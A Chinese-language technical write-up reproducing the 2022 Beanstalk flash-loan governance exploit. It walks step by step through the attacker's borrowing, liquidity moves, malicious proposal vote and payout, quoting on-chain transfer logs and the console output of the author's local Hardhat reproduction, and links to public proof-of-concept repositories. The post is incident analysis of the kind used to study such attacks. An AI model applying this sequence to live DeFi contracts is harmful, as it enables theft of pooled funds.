## 大致流程
攻击者创建了一个恶意提案,然后给这个提案投票，由于攻击者利用闪电贷获取了很多资金。项目合约中`propose`存在问题，只判断地址的资金，导致恶意提案被执行。

这个漏洞的分析参考这个:https://learnblockchain.cn/article/3909

本次的漏洞复现用了很多的技术，包括 aave,uniswap,sushiswap的flosh loan. crv的各种操作。值的复现。


## 复现流程

这里根据攻击者的操作分为以下几步

1.攻击者在通过UniswapV2将73 ETH兑换为212k BEAN。
```
https://etherscan.io/tx/0xfdd9acbc3fae083d572a2b178c8ca74a63915841a8af572a10d0055dbe91d219
From Uniswap V2: Router 2To Uniswap V2: BEAN 3 For 73 ($194,631.87)Wrapped Ethe... (WETH)
From Uniswap V2: BEAN 3To Beanstalk Flashloan Exploiter For 212,858.495697 ($12,916.58)Bean (BEAN)
```


https://etherscan.io/tx/0xcd314668aaa9bbfebaf1a0bd2b6553d01dd58899c508d4729fa7311dc5d33ad7

- 2.通过闪电贷从Aave平台借入350M DAI，500M USDC以及150M USDT，从Uniswap平台借贷32.1M BEAN，从SushiSwap平台借入11.6M LUSD
```
From Aave: aDAI Token V2To BeanstalkFlashloanContract For 350,000,000 ($350,350,000.00)Dai Stableco... (DAI)
From Aave: aUSDC Token V2To BeanstalkFlashloanContract For 500,000,000 ($499,924,500.00)USD Coin (USDC)
From Aave: aUSDT Token V2To BeanstalkFlashloanContract For 150,000,000 ($150,150,000.00)Tether USD (USDT)
From Uniswap V2: BEAN 3 To BeanstalkFlashloanContract For 32,100,950.626687 ($4,252,333.27)Bean (BEAN)
From SushiSwap: LUSD-OHMTo BeanstalkFlashloanContract For 11,643,065.703498478902362927 ($11,641,596.71)LUSD Stablec... (LUSD)
```

- 3.将借入的DAI、USDC以及USDT全部投入到Curve DAI/USDC/USDT流动性矿池中，铸造出979,691,328个流动性代币3Crv。
```
From BeanstalkFlashloanContract To Curve.fi: DAI/USDC/USDT Pool For 350,000,000 ($350,350,000.00)Dai Stableco... (DAI)
From BeanstalkFlashloanContract To Curve.fi: DAI/USDC/USDT Pool For 500,000,000 ($499,924,500.00)USD Coin (USDC)
From BeanstalkFlashloanContract To Curve.fi: DAI/USDC/USDT Pool For 150,000,000 ($150,150,000.00)Tether USD (USDT)
From Null Address: 0x000…000 To BeanstalkFlashloanContract For 979,691,328.662155074401448409 Curve.fi DAI... (3Crv)
```


- 7.将15M 3Crv兑换成15,251,318 LUSD
```
From BeanstalkFlashloanContract To 0xed279fdd11ca84beef15af5d39bb4d4bee23f0ca(Vyper_contract) For 15,000,000 Curve.fi DAI... (3Crv)
From 0xed279fdd11ca84beef15af5d39bb4d4bee23f0ca(Vyper_contract) To BeanstalkFlashloanContract For 15,251,318.11920324226629485 ($15,249,393.88)LUSD Stablec... (LUSD)
```



- 8.将964,691,328 3Crv添加流动性获得795,425,740 BEAN3CRV-f

```
From BeanstalkFlashloanContract To Beanstalk: BEAN3CRV-f Token For 964,691,328.662155074401448409 Curve.fi DAI... (3Crv)
From Null Address: 0x000…000To BeanstalkFlashloanContract For 795,425,740.813818200295323741 Curve.fi Fac... (BEAN3C...)
```



- 9.将32,100,950 BEAN以及26,894,383 LUSD添加流动性，获取58,924,887BEANLUSD-f
```
From BeanstalkFlashloanContract To Beanstalk: BEANLUSD-f Token For 32,100,950.626687 ($4,252,333.27)Bean (BEAN)
From BeanstalkFlashloanContract To Beanstalk: BEANLUSD-f Token For 26,894,383.822701721168657777 ($26,890,990.59)LUSD Stablec... (LUSD)
From Null Address: 0x000…000To BeanstalkFlashloanContract For 58,924,887.872471876761750555 Curve.fi Fac... (BEANLU...)
```



- 10.使用上面得到的所有BEAN3CRV-f,BEANLUSD-f提案进行投票，使提案通过并执行。
```
From BeanstalkFlashloanContract To Beanstalk: Beanstalk Protocol For 795,425,740.813818200295323741 Curve.fi Fac... (BEAN3C...)
From BeanstalkFlashloanContract To Beanstalk: Beanstalk Protocol For 58,924,887.872471876761750555 Curve.fi Fac... (BEANLU...)
```

11.调用BIP18


- 12.然后获得了36,084,584 BEAN，0.5407 UNI-V2，874,663,982 BEAN3CRV-f以及60,562,844 BEANLUSD-f
```
From Beanstalk: Beanstalk Protocol To BeanstalkFlashloanContract For 36,084,584.376516 ($4,780,035.34)Bean (BEAN)
From Beanstalk: Beanstalk Protocol To BeanstalkFlashloanContract For 0.540716100968756904 ($69,497,439.24)Uniswap V2 (UNI-V2)
From Beanstalk: Beanstalk Protocol To BeanstalkFlashloanContract For 874,663,982.237419391168556425 Curve.fi Fac... (BEAN3C...)
From Beanstalk: Beanstalk Protocol To BeanstalkFlashloanContract For 60,562,844.064129085666723423 Curve.fi Fac... (BEANLU...)
From Null Address: 0x000…000To BeanstalkFlashloanContract For 100 ($13.25)Bean (BEAN)
```


- 13,删除 874，663，982 CRV 单一流动性，以获得 1，007，734，729 CRV 代币
```
From BeanstalkFlashloanContract To Null Address: 0x000…000 For 874,663,982.237419391168556425 Curve.fi Fac... (BEAN3C...)
From Beanstalk: BEAN3CRV-f TokenTo BeanstalkFlashloanContract For 1,007,734,729.918865110952432204 Curve.fi DAI... (3Crv)
```

- 14.删除 60562844 BEANLUSD-f 单一流动性，以获得 28149504 LUSD
```
From BeanstalkFlashloanContract To Null Address: 0x000…000 For 60,562,844.064129085666723423 Curve.fi Fac... (BEANLU...)
From Beanstalk: BEANLUSD-f TokenTo BeanstalkFlashloanContract For 28,149,504.988150028822680438 ($28,145,953.39)LUSD Stablec... (LUSD)
```


- 15.归还SushiSwap闪电贷的11,678,100 LUSD
```
From BeanstalkFlashloanContract To SushiSwap: LUSD-OHM For 11,678,100.003509005920123297 ($11,676,626.59)LUSD Stablec... (LUSD)
```

- 16.将 32197543 BEAN 的闪存返回到 Uniswap V2  包含手续费
```
From BeanstalkFlashloanContract To Uniswap V2: BEAN 3 For 32,197,543.256457 ($4,265,128.65)Bean (BEAN)
```

- 17.将剩余的16,471,404 LUSD兑换成16,184,690 3Crv。
```
From BeanstalkFlashloanContract To 0xed279fdd11ca84beef15af5d39bb4d4bee23f0ca(Vyper_contract) For 16,471,404.984641022902557141 ($16,469,326.80)LUSD Stablec... (LUSD)
From 0xed279fdd11ca84beef15af5d39bb4d4bee23f0ca(Vyper_contract)To BeanstalkFlashloanContract For 16,184,690.4423706616519972 Curve.fi DAI... (3Crv)
```


- 18.移除511,959,710.180617886302214702 3Crv流动性，得到522,487,380 USDC，365,758,059 DAI以及156,732,232 USDT。
```
From BeanstalkFlashloanContract To Null Address: 0x000…000 For 511,959,710.180617886302214702 Curve.fi DAI... (3Crv)
From Curve.fi: DAI/USDC/USDT PoolTo BeanstalkFlashloanContract For 522,487,380.233548 ($522,408,484.64)USD Coin (USDC)
From BeanstalkFlashloanContract To Null Address: 0x000…000 For 358,371,797.126432520411550291 Curve.fi DAI... (3Crv)
From Curve.fi: DAI/USDC/USDT PoolTo BeanstalkFlashloanContract For 365,758,059.846650868575584745 ($366,123,817.91)Dai Stableco... (DAI)
From BeanstalkFlashloanContract To Null Address: 0x000…000 For 153,587,913.054185365890664411 Curve.fi DAI... (3Crv)
```


- 19.向Aave平台分别存入350,315,000 DAI，500,450,000 USDC以及150,135,000 USDT用于偿还闪电贷以及手续费。
```
From Curve.fi: DAI/USDC/USDT PoolTo BeanstalkFlashloanContract For 156,732,232.49236 ($156,888,964.72)Tether USD (USDT)
From Null Address: 0x000…000To Aave: Aave Collector V2 For 192.544598265969491594 ($193.12)Aave interes... (aDAI)
From BeanstalkFlashloanContract To Aave: aDAI Token V2 For 350,315,000 ($350,665,315.00)Dai Stableco... (DAI)
From Null Address: 0x000…000To Aave: Aave Collector V2 For 30.364909 ($30.36)Aave interes... (aUSDC)
From BeanstalkFlashloanContract To Aave: aUSDC Token V2 For 500,450,000 ($500,374,432.05)USD Coin (USDC)
From Null Address: 0x000…000To Aave: Aave Collector V2 For 89.259866 ($89.35)Aave interes... (aUSDT)
From BeanstalkFlashloanContract To Aave: aUSDT Token V2 For 150,135,000 ($150,285,135.00)Tether USD (USDT)
```


- 20.移除0.5407 UNI-V2的流动性，获得10,883 WETH以及32,511,085 BEAN并归还闪电贷的金额以及手续费。
```
From BeanstalkFlashloanContract To Uniswap V2: BEAN 3 For 0.540716100968756904 ($69,497,439.24)Uniswap V2 (UNI-V2)
From Uniswap V2: BEAN 3 To Null Address: 0x000…000 For 0.540716100968756904 ($69,497,439.24)Uniswap V2 (UNI-V2)
From Uniswap V2: BEAN 3 To BeanstalkFlashloanContract For 10,883.105341079068109889 ($32,261,659.81)Wrapped Ethe... (WETH)
From Uniswap V2: BEAN 3 To BeanstalkFlashloanContract For 32,511,085.804104 ($4,306,662.86)Bean (BEAN)
```

我们也只复现到这一步。合约中写了运行到那一步的序号,复现如下
```bash
npx hardhat run .\scripts\sample-script.js
exploitBIP address: 0xefAB0Beb0A557E452b398035eA964948c750b2Fd
beanExploit address:  0x5D42EBdBBa61412295D7b0302d6F50aC449Ddb4F
[1/xxx]Recieved 150M  USDT from Aave 150000000000000
[2/xxx]Recieved 500M USDC from Aave 500000000000000
[3/xxx]Recieved 350M DAI from Aave 350000000000000000000000000
[4/xxx]Recieved 32.1M BEAN from Uniswap 32100950626687
[5/xxx]Recieved 11.6M LUSD from Sushiswap 11643065703498478902362927
[6/xxx]Add DAI USDT USDC to Curve Pool 979691328662155074401448409
[7/xxx]exchange 3crv to lusd 26894383822701721168657777
[8/xxx]exchange 3crv to BEAN3CRV-f 795425740813818200295323741
[9/xxx]Add bean and lusd for BEANLUSD-f 58924887872471876761750555
we Bip: 20
[10/xxx]Executed Vote for BIP
[11/xxx]EXPLOXT BIP emergencyCommit !
[12/xxx] send  BEAN  UNI-V2   BEAN3CRV-f  BEANLUSD-f
[13/xxx]Remove single asset liquidity from BEAN3CRV-f
[14/xxx]Remove single asset liquidity from BEANLUSD-f
[15/xxx]Returned to sushiswap 11678100003509005920123297
[16/xxx]Returned to uniswap 32197543256457
[17/xxx]Exchange LUSD to CRV from LUSDCRV-f
[18/xxx]Remove liquidity from 3CRV Pool to get USDC, USDT & DAI back.
```



参考:
https://github.com/JIAMING-LI/BeanstalkProtocolExploit/

https://blockapex.io/beanstalk-hack-analysis-poc/

https://github.com/Rivaill/CryptoVulhub/blob/master/BeanstalkFarms20220417

https://learnblockchain.cn/article/3921